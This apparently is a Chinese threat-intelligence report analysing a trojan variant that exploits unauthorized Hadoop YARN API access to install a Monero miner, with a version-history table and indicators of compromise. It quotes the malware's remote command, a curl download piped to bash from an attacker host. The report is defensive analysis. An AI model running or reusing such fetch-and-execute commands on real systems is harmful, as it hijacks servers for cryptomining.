## 一、背景

腾讯安全威胁情报中心检测到永恒之蓝下载器木马新增利用Hadoop
Yarn未授权访问漏洞攻击。该变种入侵Linux服务器后下载门罗币挖矿木马，然后将挖矿任务进行持久化、清除竞品挖矿木马，并通过SSH爆破横向移动。

永恒之蓝下载器木马自2018年底出现以来，一直处于活跃状态。该病毒不断变化和更新攻击手法，从最初只针对Windows系统扩大攻击范围到Linux系统。截止目前，其攻击手法已涵盖弱口令爆破、系统漏洞利用、Web漏洞利用等，其中利用SSH、Redis、Hadoop
Yarn服务的攻击方式可能对云主机以及云上业务造成较大威胁。其主要入侵方式列表如下：

攻击目标系统

|

Windows

|

Linux  
  
---|---|---  
  
 **主要攻击手法**

|

Lnk漏洞CVE-2017-8464（通过移动设备）

|

SSH爆破  
  
office漏洞CVE-2017-8570（通过钓鱼邮件）

|

Redis未授权访问漏洞  
  
SMBGhost漏洞CVE-2020-0796

|

Hadoop Yarn未授权访问漏洞  
  
永恒之蓝漏洞MS17-010

|

  
  
  
mssql爆破

|

  
  
  
RDP爆破

|

  
  
  
$IPC爆破

|

  
  
  
SMB爆破

|

  
  
  
## 二、详细分析

Hadoop是一个由Apache基金会所开发的分布式系统基础架构，YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上，通过YARN来管理资源。用户可以向YARN提交特定应用程序进行执行，其中就允许执行相关包含系统命令。

YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST
API将会开放在公网导致未授权访问的问题，攻击者可以在未授权的情况下远程执行代码。

永恒之蓝下载器木马变种在yarnexec()函数中对yarn未授权访问漏洞进行利用。

![](https://image.3001.net/images/20201104/1604455086_5fa20aae3602934941ba3.png!small)  

![](https://image.3001.net/images/20201104/1604455097_5fa20ab948b75772b6d28.png!small)

  

攻击成功后执行远程命令：

export src=yarn;curl -fsSL t.amynx.com/ln/core.png?yarn|bash

core.png首先下载门罗币挖矿木马d.ackng.com/ln/xr.zip并启动挖矿进程/.Xll/xr，然后添加crontab定时任务将挖矿作业持久化。

![](https://image.3001.net/images/20201104/1604455106_5fa20ac29e20be3bb8238.png!small)

  

清除竞品挖矿木马：

![](https://image.3001.net/images/20201104/1604455116_5fa20acc7526aaa15f456.png!small)

  

利用SSH爆破进行横向移动：

![](https://image.3001.net/images/20201104/1604455125_5fa20ad5a86200a88f716.png!small)

  

永恒之蓝下载器木马历次版本更新情况如下：

 **时间**

|

 **主要技术点**  
  
---|---  
  
2018年12月14日

|

利用“驱动人生”系列软件升级通道下载，利用“永恒之蓝”漏洞攻击传播。  
  
2018年12月19日

|

下载之后的木马新增Powershell后门安装。  
  
2019年1月9日

|

检测到挖矿组件xmrig-32.mlz/xmrig-64.mlz下载。  
  
2019年1月24日

|

木马将挖矿组件、升级后门组件分别安装为计划任务，并同时安装Powershell后门。  
  
2019年1月25日

|

木马在1月24日的基础上再次更新，将攻击组件安装为计划任务，在攻击时新增利用mimikatz搜集登录密码，SMB弱口令爆破攻击，同时安装Powershell计划任务和hta计划任务。  
  
2019年2月10日

|

将攻击模块打包方式改为Pyinstaller。  
  
2019年2月20日

|

更新矿机组件，下载释放XMRig矿机，以独立进程启动挖矿。  
  
2019年2月23日

|

攻击方法再次更新，新增MsSQL爆破攻击。  
  
2019年2月25日

|

在2月23日基础上继续更新，更新MsSQL爆破攻击时密码字典，添加样本文件签名。至此攻击方法集成永恒之蓝漏洞攻击、SMB爆破攻击、MsSQL爆破攻击，同时使用黑客工具mimiktaz、psexec进行辅助攻击。  
  
2019年3月6日

|

通过已感染机器后门更新Powershell脚本横向传播模块ipc。  
  
2019年3月8日

|

通过已感染机器后门更新PE文件横向传播模块ii.exe，采用无文件攻击技术。该团伙使用的Powershell攻击代码与2018年9月发现的Mykings僵尸网络变种攻击代码有诸多相似之处。  
  
2019年3月14日

|

通过后门更新增肥木马大小、生成随机文件MD5逃避查杀，将生成的大文件木马拷贝到多个系统目录并通过注册表启动项、开始菜单启动项、计划任务进自启动。  
  
2019年3月28日

|

更新无文件攻击模块，更后新的攻击方式为：永恒之蓝漏洞攻击、弱口令爆破+WMIC、Passthehash+SMBClient/SMBExec，并通过Payload安装计划任务将木马具有的多个恶意程序进行下载。  
  
2019年4月3日

|

开创无文件挖矿新模式：挖矿脚本由PowerShell下载在内存中执行。  
  
2019年7月19日

|

无文件攻击方法新增CVE-2017-8464Lnk漏洞利用攻击，感染启动盘和网络共享盘，新增MsSQL爆破攻击。  
  
2019年10月9日

|

新增Bluekeep漏洞CVE-2019-0708检测上报功能。  
  
2020年2月12日

|

使用DGA域名，篡改hosts文件。  
  
2020年4月3日

|

新增钓鱼邮件传播，邮件附件urgent.doc包含Office漏洞CVE-2017-8570。  
  
2020年4月17日

|

钓鱼邮件新增附件readme.zip、readme.doc，新增BypassUAC模块7p.php，创建readme.js文件感染可移动盘、网络共享盘  
  
2020年5月21日

|

新增SMBGhost漏洞CVE-2020-0796检测上报功能，新增SSH爆破代码（未调用）。  
  
2020年6月10日

|

新增SMBGhost漏洞CVE-2020-0796利用攻击，新增SSH爆破、Redis爆破攻击Linux服务器并植入Linux平台挖矿木马。  
  
2020年6月24日

|

重新使用Python打包EXE攻击模块20.dat(C:\Windows\Temp\<random>.exe)，负责永恒之蓝漏洞攻击、$IPC、SMB爆破攻击。  
  
2020年8月18日

|

新增利用Yarn未授权访问漏洞攻击Linux服务器  
  
## IOCs

 **URL**

http[:]//d.ackng.com/ln/xr.zip

http[:]//t.amynx.com/ln/core.png

http[:]//t.amynx.com/ln/a.asp

http[:]//t.jdjdcjq.top/ln/a.asp

  

 **MD5**

if.bin

888dc1ca4b18a3d424498244acf81f7d

  

a.jsp(powershell)

c21caa84b327262f2cbcc12bbb510d15

kr.bin

e04acec7ab98362d87d1c53d84fc4b03

  

core.png

e49367b9e942cf2b891f60e53083c938

  

a.jsp(shell)

b204ead0dcc9ca1053a1f26628725850

  

gim.jsp

b6f0e01c9e2676333490a750e58d4464

  

 **矿池：**

lplp.ackng.com:444

  

## 参考链接：

  1. Hadoop Yarn REST API未授权漏洞利用挖矿分析

<https://www.freebuf.com/vuls/173638.html>

  

  2. 关于Apache Hadoop Yarn资源管理系统REST API未授权漏洞通知

<https://bbs.qcloud.com/thread-50090-1-1.html>

  

  3. 永恒之蓝下载器最新变种重启EXE文件攻击，新变种已感染1.5万台服务器

<https://s.tencent.com/research/report/1038.html>

  

4.<https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py>

